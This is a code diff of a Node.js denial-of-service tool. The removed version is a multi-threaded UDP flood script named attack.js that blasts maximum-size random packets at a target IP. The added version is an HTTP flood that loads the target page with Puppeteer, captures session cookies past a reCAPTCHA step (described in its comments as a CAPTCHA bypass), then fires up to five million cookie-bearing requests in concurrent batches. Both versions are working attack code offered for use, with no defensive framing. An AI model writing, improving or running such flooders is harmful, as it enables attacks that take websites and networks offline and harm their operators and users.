@@ -1,101 +1,86 @@
-const dgram = require('dgram');
-const { Worker, isMainThread } = require('worker_threads');
-const process = require('process');
+const puppeteer = require('puppeteer');
 
-// Get command-line arguments
-const targetIp = process.argv[2];  // Target IP
-const duration = parseInt(process.argv[3], 10);  // Duration in seconds
-const port = parseInt(process.argv[4], 10) || 53;  // Port (default to 53 if not provided)
-const packetSize = 65507;  // Max UDP packet size (65507 bytes)
+// Target URL
+const targetUrl = 'https://example.com'; // Replace with the target URL
 
-// Debug the arguments passed to the script
-console.log('Arguments:', process.argv);
-
-if (!targetIp || isNaN(duration) || duration <= 0) {
-    console.error('Usage: node attack.js <IP> <duration> <port (optional)>');
-    process.exit(1);
-}
-
-let totalBytesSent = 0;  // Track total bytes sent
-let lastTime = Date.now();
-
-// Generate large random UDP packets
-function generateRandomData(size) {
-    let buffer = Buffer.alloc(size);
-    for (let i = 0; i < size; i++) {
-        buffer[i] = Math.floor(Math.random() * 256);  // Random byte
+// Function to send a single HTTP request
+async function sendRequest(url, headers, method = 'GET', body = null) {
+  try {
+    const response = await fetch(url, {
+      method: method,          // GET, POST, etc.
+      headers: headers,        // Custom headers (including cookies)
+      body: body ? JSON.stringify(body) : null,  // POST/PUT body if needed
+    });
+    if (response.ok) {
+      console.log(`Request Success: Status: ${response.status}`);
+    } else {
+      console.log(`Request Failed: Status: ${response.status}`);
     }
-    return buffer;
+  } catch (error) {
+    console.error('Request failed: ', error);
+  }
 }
 
-// Main flooder logic - sends high-speed UDP packets
-function udpFlood() {
-    const socket = dgram.createSocket('udp4');  // UDP socket
+// Function to bypass CAPTCHA and get valid session cookies
+async function bypassCaptchaAndFlood() {
+  // Launch Puppeteer browser
+  const browser = await puppeteer.launch({ headless: true });
+  const page = await browser.newPage();
+  
+  // Navigate to the target URL (CAPTCHA page might appear here)
+  await page.goto(targetUrl, { waitUntil: 'domcontentloaded' });
 
-    setInterval(() => {
-        const data = generateRandomData(packetSize);  // Generate large random data
-        socket.send(data, 0, data.length, port, targetIp, (err) => {
-            if (err) {
-                console.error('Error sending packet:', err);
-            } else {
-                totalBytesSent += data.length;  // Track total bytes sent
-            }
-        });
-    }, 0);  // Send packets continuously
+  // Wait for CAPTCHA to appear (change selector based on CAPTCHA)
+  await page.waitForSelector('div#g-recaptcha');  // Adjust if needed
+  console.log("Bypassing CAPTCHA...");
+
+  // Capture session cookies after CAPTCHA is solved
+  const cookies = await page.cookies();
+  console.log('Captured Cookies:', cookies);
+
+  // Close Puppeteer browser after CAPTCHA bypass
+  await browser.close();
+
+  // Once CAPTCHA is bypassed, start flooding requests
+  floodRequests(cookies);
 }
 
-// Log the data rate (G/s) every second
-function logDataRate() {
-    setInterval(() => {
-        const currentTime = Date.now();
-        const elapsedTime = (currentTime - lastTime) / 1000;  // Time elapsed in seconds
-        const bytesPerSecond = totalBytesSent / elapsedTime;  // Bytes per second
-        const gigabitsPerSecond = (bytesPerSecond * 8) / (1024 * 1024 * 1024);  // Convert to Gbps
+// Function to flood the site with requests using concurrency
+async function floodRequests(cookies) {
+  const headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+    'Accept': 'application/json',
+    'Cookie': cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; '),
+    'Content-Type': 'application/json',
+  };
 
-        console.log(`G/s: ${gigabitsPerSecond.toFixed(2)} Gbps`);
-        totalBytesSent = 0;  // Reset the counter every second
-        lastTime = currentTime;  // Reset the time
-    }, 1000);  // Log every second
-}
+  // Number of requests in total (5 million)
+  const totalRequests = 5000000; // You can adjust this number
+  const batchSize = 1000;  // Number of requests per batch
+  const delayBetweenBatches = 1000;  // Delay in ms between batches (adjust if needed)
 
-// Worker thread logic
-if (isMainThread) {
-    const numThreads = 8;  // Use 8 threads (1 per core) for high concurrency
-    const workers = [];
+  let batchCount = Math.ceil(totalRequests / batchSize);
 
-    // Start the flood and stop after the specified duration
-    const endTime = Date.now() + duration * 1000;
-
-    // Start logging data rate
-    logDataRate();
-
-    for (let i = 0; i < numThreads; i++) {
-        const worker = new Worker(__filename);  // Launch worker threads
-        workers.push(worker);
-
-        // Add error handling for worker thread
-        worker.on('error', (err) => console.error(`Worker Error: ${err}`));
-        worker.on('exit', (exitCode) => {
-            if (exitCode !== 0) {
-                console.error(`Worker stopped with exit code ${exitCode}`);
-            }
-        });
+  // Function to handle batches of requests
+  const sendBatch = async (batchIndex) => {
+    const requests = [];
+    for (let i = 0; i < batchSize; i++) {
+      // Each request will be a concurrent fetch operation
+      requests.push(sendRequest(targetUrl, headers, 'GET'));
     }
+    // Wait for all requests in the batch to complete
+    await Promise.all(requests);
+    console.log(`Batch ${batchIndex + 1} completed.`);
 
-    // Stop the attack after the given duration
-    setTimeout(() => {
-        console.log('Attack finished. Shutting down...');
-        workers.forEach(worker => worker.terminate());
-        process.exit();
-    }, duration * 1000);
-
-} else {
-    try {
-        console.log(`Worker started: Attacking ${targetIp} on port ${port} for ${duration} seconds...`);
-        // Each worker thread starts flooding the target with large UDP packets
-        udpFlood();
-    } catch (error) {
-        console.error('Worker Error: ', error);
-        process.exit(1);  // Exit with error code if worker fails
+    if (batchIndex < batchCount - 1) {
+      // Add a slight delay before the next batch (staggered)
+      setTimeout(() => sendBatch(batchIndex + 1), delayBetweenBatches);
     }
+  };
+
+  // Start flooding the requests in batches
+  sendBatch(0);  // Start with the first batch
 }
+
+// Start the process
+bypassCaptchaAndFlood().catch(console.error);
